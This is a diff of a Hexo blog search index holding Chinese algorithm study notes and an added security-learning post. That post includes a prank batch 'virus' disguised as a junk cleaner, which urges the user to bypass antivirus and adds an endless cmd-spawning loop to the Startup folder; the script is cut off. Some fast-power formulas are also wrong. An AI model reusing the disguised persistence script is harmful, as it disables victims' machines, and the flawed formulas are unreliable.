@@ -1,6 +1,70 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Brian Kernighan Algorithm</title>
+    <url>/2022/05/25/Algorithm/Brian-Kernighan-Algorithm/</url>
+    <content><![CDATA[<h1 id="Brian-Kernighan-Algorithm"><a href="#Brian-Kernighan-Algorithm" class="headerlink" title="Brian Kernighan Algorithm"></a>Brian Kernighan Algorithm</h1><h2 id="principle"><a href="#principle" class="headerlink" title="principle"></a>principle</h2><p>通过一定的位运算取到二进制数据的相应位</p>
+<ol>
+<li><p>$n\&amp;(n-1)$ 将数据二进制最右的 1 变为 0 </p>
+<p>例如：$n = 11_{(10)} = 1011_{(2)}, n\&amp;(n-1) = 1011 \&amp; 1010 = 1010_{(2)} = 10_{(10)}$</p>
+</li>
+<li><p>$n\&amp;(~n+1)$ 提取数据二进制最后一个 1 到结尾的数据</p>
+<p>例如：$n = 14_{(10)} = 1110_{(2)}, n\&amp;(~n+1) = 1110 \&amp; 0001 + 00001 = 1110 \&amp; 0010 = 0010_{(2)} = 2_{(10)}$</p>
+</li>
+</ol>
+<p>可以测试一下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = random.randint(<span class="number">0</span>,<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(n,<span class="built_in">bin</span>(n))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n&amp;(n−1):&#x27;</span>,n&amp;(n-<span class="number">1</span>),<span class="built_in">bin</span>(n&amp;(n-<span class="number">1</span>)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n&amp;(~n+1):&#x27;</span>,n&amp;(~n+<span class="number">1</span>),<span class="built_in">bin</span>(n&amp;(~n+<span class="number">1</span>)))</span><br></pre></td></tr></table></figure>
+<h2 id="example："><a href="#example：" class="headerlink" title="example："></a>example：</h2><p><a href="https://leetcode.cn/problems/number-of-1-bits/">191. 位1的个数</a></p>
+]]></content>
+      <categories>
+        <category>Code_Algo</category>
+      </categories>
+      <tags>
+        <tag>Math,Binary</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>矩阵快速幂</title>
+    <url>/2022/05/25/Algorithm/%E7%9F%A9%E9%98%B5%E5%BF%AB%E9%80%9F%E5%B9%82/</url>
+    <content><![CDATA[<h1 id="矩阵快速幂"><a href="#矩阵快速幂" class="headerlink" title="矩阵快速幂"></a><strong>矩阵快速幂</strong></h1><h2 id="整数快速幂"><a href="#整数快速幂" class="headerlink" title="整数快速幂"></a>整数快速幂</h2><p>解释：计算模幂运算时，可用的规则有：</p>
+<script type="math/tex; mode=display">
+(a+b)\%m=(a\%m+b\%m)\%m\\
+(a*b)\%m=(a\%m*b\%m)\%m</script><p>求幂次时可用将幂次拆分，如 $a^{b}$，</p>
+<ul>
+<li>b 为奇数时， $a^{b} = a^{b-1}*a^b$</li>
+<li>b 为偶数时， $a^{b} = (a^2)^{b-1}$</li>
+</ul>
+<p>一般是在取模的情况下快速幂，否则会数据过大</p>
+<p>例：求 $a^{b}\  \% \ c$</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">b = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">c = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="comment"># a^b%c</span></span><br><span class="line">res = <span class="number">1</span>	<span class="comment">#初始为为单位元</span></span><br><span class="line"><span class="keyword">while</span> b&gt;<span class="number">0</span>:</span><br><span class="line">  <span class="keyword">if</span> b&amp;<span class="number">1</span>:</span><br><span class="line">    res = (res * a) % c</span><br><span class="line">  a = a*a</span><br><span class="line">  b &gt;&gt;= <span class="number">1</span> <span class="comment"># == b//2</span></span><br><span class="line">  <span class="comment">#print(a,b,res)</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
+<h2 id="矩阵快速幂-1"><a href="#矩阵快速幂-1" class="headerlink" title="矩阵快速幂"></a>矩阵快速幂</h2><p>矩阵快速幂和整数快速幂原理相同，要求矩阵是方阵，以求斐波那契数列为例：</p>
+<script type="math/tex; mode=display">
+\left[\begin{array}{ll}
+1 & 1 \\
+1 & 0
+\end{array}\right]\left[\begin{array}{c}
+F(n) \\
+F(n-1)
+\end{array}\right]=\left[\begin{array}{c}
+F(n)+F(n-1) \\
+F(n)
+\end{array}\right]=\left[\begin{array}{c}
+F(n+1) \\
+F(n)
+\end{array}\right]</script><p>因此：</p>
+<script type="math/tex; mode=display">
+\left[ \begin{matrix} F(n + 1)\\ F(n) \end{matrix} \right] = \left[ \begin{matrix} 1 & 1 \\ 1 & 0 \end{matrix} \right] ^n \left[ \begin{matrix} F(1)\\ F(0) \end{matrix} \right]</script><p>令：</p>
+<script type="math/tex; mode=display">
+M = \left[ \begin{matrix} 1 & 1 \\ 1 & 0 \end{matrix} \right]</script><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fib</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> n &lt; <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">multiply_matrix</span>(<span class="params">a,b</span>):</span><br><span class="line">            <span class="comment">#a,b = matrix</span></span><br><span class="line">            <span class="comment">#return matrix</span></span><br><span class="line">            c=[[<span class="number">0</span>,<span class="number">0</span>],[<span class="number">0</span>,<span class="number">0</span>]]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                    c[i][j] = (a[i][<span class="number">0</span>]*b[<span class="number">0</span>][j] + a[i][<span class="number">1</span>]*b[<span class="number">1</span>][j]) % <span class="number">1000000007</span></span><br><span class="line">                    <span class="built_in">print</span>(c)</span><br><span class="line">            <span class="keyword">return</span> c</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">pow_matrix</span>(<span class="params">a,n</span>):</span><br><span class="line">            <span class="comment">#初始化为单位阵，不会影响初始运算</span></span><br><span class="line">            res = [[<span class="number">1</span>,<span class="number">0</span>],[<span class="number">0</span>,<span class="number">1</span>]] </span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">if</span> n &amp; <span class="number">1</span>:</span><br><span class="line">                    res = multiply_matrix(res,a)</span><br><span class="line">                n &gt;&gt;= <span class="number">1</span>  <span class="comment">#右移一位相当于 ceil(n//2)</span></span><br><span class="line">                a = multiply_matrix(a,a)</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">        ans = pow_matrix([[<span class="number">1</span>,<span class="number">1</span>],[<span class="number">1</span>,<span class="number">0</span>]],n-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> ans[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>Code_Algo</category>
+      </categories>
+      <tags>
+        <tag>Math</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>如何判断三点是否共线？</title>
     <url>/2022/06/09/Algorithm/%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E4%B8%89%E7%82%B9%E6%98%AF%E5%90%A6%E5%85%B1%E7%BA%BF%EF%BC%9F/</url>
     <content><![CDATA[<h2 id="判断三点共线"><a href="#判断三点共线" class="headerlink" title="判断三点共线"></a>判断三点共线</h2><p>判断三点是否共线，有三种方法（其实实质上是两种）</p>
@@ -114,61 +178,24 @@ x 3 & y 3 & 1
       </tags>
   </entry>
   <entry>
-    <title>Brian Kernighan Algorithm</title>
-    <url>/2022/05/25/Algorithm/Brian-Kernighan-Algorithm/</url>
-    <content><![CDATA[<h1 id="Brian-Kernighan-Algorithm"><a href="#Brian-Kernighan-Algorithm" class="headerlink" title="Brian Kernighan Algorithm"></a>Brian Kernighan Algorithm</h1><h2 id="principle"><a href="#principle" class="headerlink" title="principle"></a>principle</h2><p>通过一定的位运算取到二进制数据的相应位</p>
+    <title>二分查找</title>
+    <url>/2022/07/15/Algorithm/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/</url>
+    <content><![CDATA[<h1 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h1><p>二分查找最关键的点在于<strong>区间的划分</strong></p>
+<p>设置一般有两种区间：</p>
 <ol>
-<li><p>$n\&amp;(n-1)$ 将数据二进制最右的 1 变为 0 </p>
-<p>例如：$n = 11_{(10)} = 1011_{(2)}, n\&amp;(n-1) = 1011 \&amp; 1010 = 1010_{(2)} = 10_{(10)}$</p>
+<li><p><code>[left,right]</code> 对应 <code>while(left&lt;=right)</code>  表示 <code>right</code> 有意义</p>
 </li>
-<li><p>$n\&amp;(~n+1)$ 提取数据二进制最后一个 1 到结尾的数据</p>
-<p>例如：$n = 14_{(10)} = 1110_{(2)}, n\&amp;(~n+1) = 1110 \&amp; 0001 + 00001 = 1110 \&amp; 0010 = 0010_{(2)} = 2_{(10)}$</p>
+<li><p><code>[left,right)</code>对应 <code>while(left&lt;right)</code> 表示 <code>right</code> 无意义</p>
 </li>
 </ol>
-<p>可以测试一下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = random.randint(<span class="number">0</span>,<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(n,<span class="built_in">bin</span>(n))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n&amp;(n−1):&#x27;</span>,n&amp;(n-<span class="number">1</span>),<span class="built_in">bin</span>(n&amp;(n-<span class="number">1</span>)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n&amp;(~n+1):&#x27;</span>,n&amp;(~n+<span class="number">1</span>),<span class="built_in">bin</span>(n&amp;(~n+<span class="number">1</span>)))</span><br></pre></td></tr></table></figure>
-<h2 id="example："><a href="#example：" class="headerlink" title="example："></a>example：</h2><p><a href="https://leetcode.cn/problems/number-of-1-bits/">191. 位1的个数</a></p>
-]]></content>
-      <categories>
-        <category>Code_Algo</category>
-      </categories>
-      <tags>
-        <tag>Math,Binary</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>矩阵快速幂</title>
-    <url>/2022/05/25/Algorithm/%E7%9F%A9%E9%98%B5%E5%BF%AB%E9%80%9F%E5%B9%82/</url>
-    <content><![CDATA[<h1 id="矩阵快速幂"><a href="#矩阵快速幂" class="headerlink" title="矩阵快速幂"></a><strong>矩阵快速幂</strong></h1><h2 id="整数快速幂"><a href="#整数快速幂" class="headerlink" title="整数快速幂"></a>整数快速幂</h2><p>解释：计算模幂运算时，可用的规则有：</p>
-<script type="math/tex; mode=display">
-(a+b)\%m=(a\%m+b\%m)\%m\\
-(a*b)\%m=(a\%m*b\%m)\%m</script><p>求幂次时可用将幂次拆分，如 $a^{b}$，</p>
-<ul>
-<li>b 为奇数时， $a^{b} = a^{b-1}*a^b$</li>
-<li>b 为偶数时， $a^{b} = (a^2)^{b-1}$</li>
-</ul>
-<p>一般是在取模的情况下快速幂，否则会数据过大</p>
-<p>例：求 $a^{b}\  \% \ c$</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">b = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">c = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="comment"># a^b%c</span></span><br><span class="line">res = <span class="number">1</span>	<span class="comment">#初始为为单位元</span></span><br><span class="line"><span class="keyword">while</span> b&gt;<span class="number">0</span>:</span><br><span class="line">  <span class="keyword">if</span> b&amp;<span class="number">1</span>:</span><br><span class="line">    res = (res * a) % c</span><br><span class="line">  a = a*a</span><br><span class="line">  b &gt;&gt;= <span class="number">1</span> <span class="comment"># == b//2</span></span><br><span class="line">  <span class="comment">#print(a,b,res)</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
-<h2 id="矩阵快速幂-1"><a href="#矩阵快速幂-1" class="headerlink" title="矩阵快速幂"></a>矩阵快速幂</h2><p>矩阵快速幂和整数快速幂原理相同，要求矩阵是方阵，以求斐波那契数列为例：</p>
-<script type="math/tex; mode=display">
-\left[\begin{array}{ll}
-1 & 1 \\
-1 & 0
-\end{array}\right]\left[\begin{array}{c}
-F(n) \\
-F(n-1)
-\end{array}\right]=\left[\begin{array}{c}
-F(n)+F(n-1) \\
-F(n)
-\end{array}\right]=\left[\begin{array}{c}
-F(n+1) \\
-F(n)
-\end{array}\right]</script><p>因此：</p>
-<script type="math/tex; mode=display">
-\left[ \begin{matrix} F(n + 1)\\ F(n) \end{matrix} \right] = \left[ \begin{matrix} 1 & 1 \\ 1 & 0 \end{matrix} \right] ^n \left[ \begin{matrix} F(1)\\ F(0) \end{matrix} \right]</script><p>令：</p>
-<script type="math/tex; mode=display">
-M = \left[ \begin{matrix} 1 & 1 \\ 1 & 0 \end{matrix} \right]</script><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fib</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> n &lt; <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">multiply_matrix</span>(<span class="params">a,b</span>):</span><br><span class="line">            <span class="comment">#a,b = matrix</span></span><br><span class="line">            <span class="comment">#return matrix</span></span><br><span class="line">            c=[[<span class="number">0</span>,<span class="number">0</span>],[<span class="number">0</span>,<span class="number">0</span>]]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                    c[i][j] = (a[i][<span class="number">0</span>]*b[<span class="number">0</span>][j] + a[i][<span class="number">1</span>]*b[<span class="number">1</span>][j]) % <span class="number">1000000007</span></span><br><span class="line">                    <span class="built_in">print</span>(c)</span><br><span class="line">            <span class="keyword">return</span> c</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">pow_matrix</span>(<span class="params">a,n</span>):</span><br><span class="line">            <span class="comment">#初始化为单位阵，不会影响初始运算</span></span><br><span class="line">            res = [[<span class="number">1</span>,<span class="number">0</span>],[<span class="number">0</span>,<span class="number">1</span>]] </span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">if</span> n &amp; <span class="number">1</span>:</span><br><span class="line">                    res = multiply_matrix(res,a)</span><br><span class="line">                n &gt;&gt;= <span class="number">1</span>  <span class="comment">#右移一位相当于 ceil(n//2)</span></span><br><span class="line">                a = multiply_matrix(a,a)</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">        ans = pow_matrix([[<span class="number">1</span>,<span class="number">1</span>],[<span class="number">1</span>,<span class="number">0</span>]],n-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> ans[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>如果是 <code>&gt;</code> 情况就反过来</p>
+<p>而在判断时，显然当 <code>while(left&lt;=right)</code> 时，<code>right</code> 有意义，区间为<code>[left,right]</code>，下一次查找的区间变成<code>[left,mid-1]</code>（<code>mid</code>已经判断过不是<code>target</code>）所以在移动 <code>right</code> 时，使用 <code>right=mid-1</code> 。</p>
+<p>当<code>while(left&lt;right)</code>时，<code>right</code>无意义，区间为<code>[left,right)</code>，下一次查找的区间变成<code>[left,mid)</code> ，<code>mid</code>已经判断过不是<code>target</code>，但<code>right</code>不会取到，所以不需要<code>right=mid-1</code> 。</p>
+<p>题目：（这题用区间 <code>[left,right]</code> 更好）</p>
+<p><a href="https://leetcode.cn/problems/binary-search/">704. 二分查找</a></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span> target)</span>&#123;</span><br><span class="line">    <span class="type">int</span> left=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> right=numsSize<span class="number">-1</span>;</span><br><span class="line">    <span class="comment">//区间设置[left,right)</span></span><br><span class="line">    <span class="type">int</span> mid;</span><br><span class="line">    <span class="keyword">while</span>(left&lt;right)&#123;</span><br><span class="line">        mid = (left+right)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(nums[mid] == target)</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(nums[mid] &lt; target)</span><br><span class="line">            left = mid + <span class="number">1</span>; <span class="comment">//左区间能取到</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            right = mid; <span class="comment">//右区间取不到</span></span><br><span class="line">        <span class="comment">//printf(&quot;%d,%d,%d\n&quot;,left,right,mid);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(left == right &amp;&amp; nums[left] == target)</span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span> target)</span>&#123;</span><br><span class="line">    <span class="comment">//区间[left,right]</span></span><br><span class="line">    <span class="type">int</span> left = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> right = numsSize<span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> mid;</span><br><span class="line">    <span class="keyword">while</span>(left &lt;= right)&#123;</span><br><span class="line">        mid = (left + right) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(nums[mid] == target)</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(nums[mid] &lt; target)</span><br><span class="line">            left = mid + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span>   </span><br><span class="line">            right = mid - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>RE：<a href="https://www.programmercarl.com/0704.%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE.html#_704-%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE">https://www.programmercarl.com/0704.%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE.html#_704-%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE</a></p>
 ]]></content>
       <categories>
         <category>Code_Algo</category>
@@ -210,31 +237,6 @@ M = \left[ \begin{matrix} 1 & 1 \\ 1 & 0 \end{matrix} \right]</script><figure cl
       </tags>
   </entry>
   <entry>
-    <title>网安学习_D.1_环境部署</title>
-    <url>/2022/05/25/CS/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0-D-1-%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/</url>
-    <content><![CDATA[<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>使用 Vmware 装上几个旧window系统的虚拟机 win-xp/2003/7/2008</p>
-<h2 id="winxp"><a href="#winxp" class="headerlink" title="winxp"></a>winxp</h2><p>我的配置：</p>
-<ol>
-<li>使用的 winxp_professional 镜像(来自 msdn.itellyou)，删掉了 打印机，声卡</li>
-<li>分配 40G 空间（20+20）</li>
-<li>关掉了防火墙和自动更新</li>
-<li>至此，拍摄快照并克隆虚拟机（链接）<ul>
-<li>链接克隆和完整克隆的区别：链接克隆创建一个主虚拟机的子链接， 与主虚拟机并存（占用空间小）；完整克隆复制出一个独立的虚拟机（占用和主虚拟机一样大的空间）</li>
-</ul>
-</li>
-</ol>
-<h2 id="win2003"><a href="#win2003" class="headerlink" title="win2003"></a>win2003</h2><p>同上</p>
-<h2 id="win7"><a href="#win7" class="headerlink" title="win7"></a>win7</h2><p>没设密码</p>
-<h2 id="win2008"><a href="#win2008" class="headerlink" title="win2008"></a>win2008</h2><p>同上</p>
-]]></content>
-      <categories>
-        <category>CS</category>
-      </categories>
-      <tags>
-        <tag>CS_OP</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>蓄水池采样</title>
     <url>/2022/05/25/Algorithm/%E8%93%84%E6%B0%B4%E6%B1%A0%E7%AE%97%E6%B3%95/</url>
     <content><![CDATA[<h1 id="蓄水池采样算法-Reservoir-Sampling"><a href="#蓄水池采样算法-Reservoir-Sampling" class="headerlink" title="蓄水池采样算法 (Reservoir Sampling)"></a>蓄水池采样算法 (Reservoir Sampling)</h1><p><a href="https://www.bilibili.com/video/BV17i4y1j7wE/?spm_id_from=333.788.recommend_more_video.1">https://www.bilibili.com/video/BV17i4y1j7wE/?spm_id_from=333.788.recommend_more_video.1</a></p>
@@ -265,6 +267,31 @@ or\\
       </categories>
       <tags>
         <tag>Math</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网安学习_D.1_环境部署</title>
+    <url>/2022/05/25/CS/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0-D-1-%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/</url>
+    <content><![CDATA[<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>使用 Vmware 装上几个旧window系统的虚拟机 win-xp/2003/7/2008</p>
+<h2 id="winxp"><a href="#winxp" class="headerlink" title="winxp"></a>winxp</h2><p>我的配置：</p>
+<ol>
+<li>使用的 winxp_professional 镜像(来自 msdn.itellyou)，删掉了 打印机，声卡</li>
+<li>分配 40G 空间（20+20）</li>
+<li>关掉了防火墙和自动更新</li>
+<li>至此，拍摄快照并克隆虚拟机（链接）<ul>
+<li>链接克隆和完整克隆的区别：链接克隆创建一个主虚拟机的子链接， 与主虚拟机并存（占用空间小）；完整克隆复制出一个独立的虚拟机（占用和主虚拟机一样大的空间）</li>
+</ul>
+</li>
+</ol>
+<h2 id="win2003"><a href="#win2003" class="headerlink" title="win2003"></a>win2003</h2><p>同上</p>
+<h2 id="win7"><a href="#win7" class="headerlink" title="win7"></a>win7</h2><p>没设密码</p>
+<h2 id="win2008"><a href="#win2008" class="headerlink" title="win2008"></a>win2008</h2><p>同上</p>
+]]></content>
+      <categories>
+        <category>CS</category>
+      </categories>
+      <tags>
+        <tag>CS_OP</tag>
       </tags>
   </entry>
   <entry>
@@ -387,6 +414,61 @@ or\\
       </tags>
   </entry>
   <entry>
+    <title>网安学习-D-3-批处理，脚本，过时小病毒</title>
+    <url>/2022/05/27/CS/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0-D-3-%E6%89%B9%E5%A4%84%E7%90%86%EF%BC%8C%E8%84%9A%E6%9C%AC%EF%BC%8C%E8%BF%87%E6%97%B6%E5%B0%8F%E7%97%85%E6%AF%92/</url>
+    <content><![CDATA[<p>环境：win2003 虚拟机</p>
+<p>只做简单了解，并不深究…</p>
+<h2 id="批处理"><a href="#批处理" class="headerlink" title="批处理"></a>批处理</h2><p>建一个 txt 文件，后缀名改成 bat 变成批处理文件</p>
+<p>使用的是 <a href="https://www.jianshu.com/p/02f6fe974cfd">DOS 命令语法</a> </p>
+<p><strong>发布博客的批处理文件</strong></p>
+<p>我自己的：</p>
+<ol>
+<li>push</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">d:</span><br><span class="line"><span class="built_in">cd</span> D:\Docc\GitBlog</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure>
+<ol>
+<li>check</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">d:</span><br><span class="line"><span class="built_in">cd</span> D:\Docc\GitBlog</span><br><span class="line">start <span class="string">&quot;C:\Program Files\Google\Chrome\Application&quot;</span> http://localhost:4000/</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</span><br></pre></td></tr></table></figure>
+<p>3.NewBlog</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">d:</span><br><span class="line"><span class="built_in">cd</span> D:\Docc\GitBlog</span><br><span class="line"><span class="built_in">set</span> /p title=Input_NewBlog`s title:</span><br><span class="line">hexo n %title%</span><br></pre></td></tr></table></figure>
+<p><strong>一个小例子</strong></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">@echo off         </span><br><span class="line">color <span class="number">0</span>a             </span><br><span class="line">title 飞哥小程序v1<span class="number">.0</span> </span><br><span class="line"> </span><br><span class="line">:menu</span><br><span class="line">cls</span><br><span class="line">echo ==========================</span><br><span class="line">echo               菜单</span><br><span class="line">echo         <span class="number">1</span>、修改管理员密码</span><br><span class="line">echo         <span class="number">2</span>、定时关机</span><br><span class="line">echo         <span class="number">3</span>、退出本程序</span><br><span class="line">echo ===========================</span><br><span class="line"> </span><br><span class="line"><span class="built_in">set</span> /p num=您的选择是：   </span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;%num%&quot;</span>==<span class="string">&quot;1&quot;</span> <span class="keyword">goto</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;%num%&quot;</span>==<span class="string">&quot;2&quot;</span> <span class="keyword">goto</span> <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;%num%&quot;</span>==<span class="string">&quot;3&quot;</span> <span class="keyword">goto</span> <span class="number">3</span></span><br><span class="line">echo 被闹，好好输！</span><br><span class="line">pause	<span class="comment">//暂停</span></span><br><span class="line"><span class="keyword">goto</span> menu	<span class="comment">//跳转</span></span><br><span class="line"> </span><br><span class="line">:<span class="number">1</span></span><br><span class="line"><span class="built_in">set</span> /p u=请输入用户名:	<span class="comment">//set /p 等待变量输入 u 变量</span></span><br><span class="line"><span class="built_in">set</span> /p p=请输入新密码:</span><br><span class="line">net user %u% %p%   &gt;nul		<span class="comment">// &gt;nul 清楚命令执行后系统反馈</span></span><br><span class="line">echo 您的密码已经设置成功!</span><br><span class="line">pause</span><br><span class="line"><span class="keyword">goto</span> menu</span><br><span class="line"> </span><br><span class="line">:<span class="number">2</span></span><br><span class="line"><span class="built_in">set</span> /p time=请输入时间：</span><br><span class="line">shutdown -s -t %time%  </span><br><span class="line"><span class="built_in">set</span> /p x=是否取消（<span class="number">1</span>：是，<span class="number">0</span>：否）：</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;%x%&quot;</span>==<span class="string">&quot;1&quot;</span> shutdown -a</span><br><span class="line"><span class="keyword">goto</span> menu</span><br><span class="line">pause</span><br><span class="line"> </span><br><span class="line">:<span class="number">3</span></span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://ossimg.yzitc.com/2022/05/27/ff1fe64a50f38.png"></p>
+<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p>新建 txt 文件，后缀名改为 vbs（Microsoft <strong>Visual Basic Script</strong> Edition） 即为简单的脚本</p>
+<p>如：</p>
+<figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line"> msgbox <span class="string">&quot;I am a script!!&quot;</span></span><br><span class="line"><span class="keyword">loop</span></span><br></pre></td></tr></table></figure>
+<p>效果：(一直循环，关不掉，需要在任务管理器中找到进程 wscript.exe 强制关掉)</p>
+<p><img src="https://ossimg.yzitc.com/2022/05/27/80cf40b1595db.png"></p>
+<p>参考：</p>
+<p><a href="https://baike.baidu.com/item/vbs/1700748?fr=aladdin">vbs脚本语言</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/367897802">vbs基本语法1</a></p>
+<p><a href="https://blog.csdn.net/xiaozhi_95/article/details/81669270">vbs基本语法2</a></p>
+<h2 id="过时小病毒"><a href="#过时小病毒" class="headerlink" title="过时小病毒"></a>过时小病毒</h2><p>几个想法：</p>
+<ul>
+<li>添加 开机自启动项，无限弹窗</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">title 系统垃圾清理</span><br><span class="line">color 2f</span><br><span class="line"><span class="built_in">echo</span> =======若杀毒软件恶意拦截，请选择【允许程序的所有操作】========</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span> :start&gt;c:\windows\windows.bat</span><br><span class="line"><span class="built_in">echo</span> start cmd&gt;&gt;c:\windows\windows.bat</span><br><span class="line"><span class="built_in">echo</span> goto start&gt;&gt;c:\windows\windows.bat</span><br><span class="line">copy c:\windows\windows.bat <span class="string">&quot;%USERPROFILE%&quot;</span>\AppData\Roaming\Microsoft\Windows\StartMenu\Programs\Startup\&quot; &gt;nul</span><br><span class="line"><span class="keyword">if</span> %errorlevel%==0 goto next </span><br><span class="line">copy c:\windows\windows.bat <span 